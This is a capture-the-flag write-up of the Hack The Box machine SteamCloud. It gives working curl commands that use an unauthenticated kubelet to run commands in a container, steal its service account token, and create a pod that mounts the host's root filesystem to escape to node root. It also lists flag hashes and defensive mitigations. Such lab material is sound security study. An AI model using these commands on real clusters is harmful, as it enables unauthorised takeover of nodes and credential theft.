# SteamCloud — Hack The Box

| Field | Value |
|-------|-------|
| **Box** | SteamCloud |
| **Difficulty** | Easy |
| **OS** | Linux (minikube / Debian 10) |
| **IP** | 10.129.96.167 |
| **Date** | 2026-04-05 |
| **Flags** | `user.txt` · `root.txt` |

---

## Executive Summary

SteamCloud is an **Easy-rated Linux box** hosting a misconfigured **minikube** single-node Kubernetes cluster. The entry point is an **unauthenticated kubelet API** on port 10250, which permits arbitrary command execution inside any running container. Inside the container, the built-in `default` service account token is used to authenticate to the kube-apiserver and create a new pod with a `hostPath` volume mounting the host's root filesystem — achieving container escape to full node root.

**Root cause:** Kubelet port 10250 exposed without authentication + `hostPath` volume with `path: /`.

---

## Attack Chain

```
[Attacker]  Port 10250 (kubelet)   →  /run endpoint  →  arbitrary cmd inside nginx container
                                                                 │
                                                      Service account token @ /var/run/secrets/...
                                                                 │
                                                    kube-apiserver :8443  (authenticated)
                                                                 │
                                                   CREATE pod with hostPath: path=/ → mount at /h
                                                                 │
                                                   /run in malicious pod → /h/root/root.txt
                                                                 │
                                                            [NODE ROOT]
```

---

## Initial Access — Unauthenticated Kubelet RCE

### 1. Recon — Discover Open Kubelet API

```bash
nmap -sC -sV -Pn 10.129.96.167
```

| Port | Service | Notes |
|------|---------|-------|
| 22   | ssh     | OpenSSH 7.9p1 Debian 10 |
| 8443 | https   | kube-apiserver (minikube) — requires auth |
| **10250** | **ssl/kubelet** | **🔴 Unauthenticated access** |

Check if the kubelet API is reachable and unauthenticated:

```bash
curl -sk https://10.129.96.167:10250/
# Returns kubelet info — API is live and open

curl -sk https://10.129.96.167:10250/pods
# Returns full pod list — no auth required
```

### 2. Enumerate Pods

```bash
curl -sk https://10.129.96.167:10250/pods | python3 -m json.tool
```

Key finding: an `nginx` pod in the `default` namespace has a **hostPath volume** already mounted — `hostPath: /opt/flag` mapped into the container at `/root`. This was placed by the box author to provide an early flag.

### 3. Execute Commands via `/run` Endpoint

The kubelet's `/run/{namespace}/{pod}/{container}` endpoint executes arbitrary commands inside a running container — **no authentication required**.

```bash
# Read the flag already placed via hostPath (inside nginx container)
curl -sk -X POST https://10.129.96.167:10250/run/default/nginx/nginx \
  -d 'cmd=cat /root/user.txt'
# ➜ 9fc5afba3ea16298491d9b4713837817
```

**Why this works:**
- The `nginx` container runs as **root** (uid 0)
- The kubelet's `/run` endpoint does **not** validate caller identity when anonymous auth is enabled
- Any request to `/run/{ns}/{pod}/{container}` is executed in the specified container

### Initial Access Summary

| | |
|---|---|
| **Method** | Unauthenticated kubelet `/run` endpoint |
| **Container** | nginx (default namespace) |
| **Container User** | root |
| **Flag** | `9fc5afba3ea16298491d9b4713837817` |

---

## Privilege Escalation — Container Escape via hostPath Pod

Even with root inside the container, we are confined to the container's filesystem. The escape uses the **Kubernetes service account + hostPath pod** pattern.

### 1. Extract the Service Account Token

Every pod has a service account token mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`. The `default` service account in the `default` namespace can authenticate to the kube-apiserver at port 8443.

```bash
TOKEN=$(curl -sk -X POST https://10.129.96.167:10250/run/default/nginx/nginx \
  -d 'cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token')
echo "$TOKEN"
```

### 2. Verify Token Against kube-apiserver

```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://10.129.96.167:8443/api/v1/namespaces/default/pods
# Returns pod list — token is valid ✅
```

The `default` service account has enough RBAC permissions to **create pods** — this is the escape vector.

### 3. Create Malicious Pod with hostPath (`/` → `/h`)

```bash
curl -sk -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  https://10.129.96.167:8443/api/v1/namespaces/default/pods \
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "privesc-pod"},
    "spec": {
      "containers": [{
        "name": "privesc",
        "image": "nginx:1.14.2",
        "imagePullPolicy": "IfNotPresent",
        "command": ["/bin/bash", "-c", "sleep 1000"],
        "volumeMounts": [{"name": "hostfs", "mountPath": "/h"}]
      }],
      "volumes": [{
        "name": "hostfs",
        "hostPath": {"path": "/"}
      }]
    }
  }'
```

> **Note:** `imagePullPolicy: IfNotPresent` is critical — `nginx:1.14.2` already exists on the minikube node; without this the kubelet would try (and fail) to pull from a registry.

**What this does:**
- Creates a new pod `privesc-pod` in the `default` namespace
- `hostPath: { path: "/" }` mounts the **host node's root filesystem**
- Mounted into the container at `/h`
- Container stays alive via `sleep 1000` so we can exec into it

### 4. Read root.txt from the Escaped Container

```bash
# Wait ~5 seconds for pod to start, then exec
curl -sk -X POST \
  "https://10.129.96.167:10250/run/default/privesc-pod/privesc" \
  -d 'cmd=cat /h/root/root.txt'
# ➜ 9b6bf8d1cab1636fa9731824e359bee9
```

**Path explained:**
- `/h/` = the minikube node's root filesystem (via hostPath)
- `/h/root/` = root user's home directory on the host node
- `/h/root/root.txt` = the host's root flag

### Container Escape Diagram

```
┌─────────────────────────────────────────────┐
│  Host (minikube node)  —  10.129.96.167     │
│  Filesystem: /                               │
│    └── root/                                 │
│        └── root.txt  ← TARGET               │
│                                             │
│  kubelet :10250 (unauthenticated)           │
└──────────────────┬──────────────────────────┘
                   │ hostPath: path=/
                   ▼
┌─────────────────────────────────────────────┐
│  Pod "privesc-pod"  (nginx:1.14.2)          │
│  Container filesystem: /                     │
│    └── h/  ← host / mounted here             │
│        └── root/                             │
│            └── root.txt  ← accessible!       │
└─────────────────────────────────────────────┘
```

### Privilege Escalation Summary

| | |
|---|---|
| **Method** | hostPath volume container escape |
| **From** | root inside nginx container |
| **To** | root on minikube node |
| **Key components** | default SA token → kube-apiserver → create pod with hostPath `/` |

---

## Flags

| Flag | Hash | Location |
|------|------|----------|
| `user.txt` | `9fc5afba3ea16298491d9b4713837817` | `/root/user.txt` inside nginx container (via pre-placed hostPath) |
| `root.txt` | `9b6bf8d1cab1636fa9731824e359bee9` | `/h/root/root.txt` from escaped pod (host root) |

---

## Lessons Learned

### 1. Kubelet Port 10250 — Critical Attack Surface
When kubelet's port 10250 is exposed without authentication, the `/run` endpoint gives **arbitrary command execution across all pods on the node**. In production clusters, kubelet should have `--anonymous-auth=false` and strong cert-based auth. Port 10250 should never be directly accessible from untrusted networks.

### 2. hostPath Volumes Are Dangerous
Mounting `path: /` via hostPath is a **full container escape**. It exposes the entire node filesystem into the container. Even a non-privileged container can read (and potentially write) host files. In production: avoid hostPath, use projected volumes, and run pods with non-root users.

### 3. Service Account Token = Escape Lever
The `default` service account has **create pods** permission by default RBAC policy. Even inside an unprivileged container, if you can exfiltrate the service account token, you can create pods. Always follow least-privilege for service accounts.

### 4. minikube vs. Real Clusters
minikube runs a **single-node cluster inside a VM**. "Escaping" to the host means escaping into the minikube VM, not the physical machine. The flags live on the minikube node's filesystem, not on bare metal.

### 5. imagePullPolicy for Offline Images
When creating pods that use images already present on the node (common in air-gapped environments), set `imagePullPolicy: IfNotPresent`. Otherwise the API server attempts a registry pull and fails if the registry is unreachable.

### Defensive Mitigations
- Set `--anonymous-auth=false` on kubelet
- Enable RBAC and follow least-privilege for service accounts
- Disable or restrict `hostPath` volumes
- Run pods as non-root (`runAsNonRoot: true`)
- Network policies to block pod-to-pod on port 10250
- Do not expose kubelet port to untrusted networks

---

## Full Documentation

Detailed working notes (including failed attempts and raw commands) available at:
```
/home/openclaw/.openclaw/workspace-neo/htb/boxes/retired/SteamCloud/
```

Files:
- `recon.md` — reconnaissance findings
- `exploit.md` — initial access exploitation
- `privesc.md` — privilege escalation (container escape)
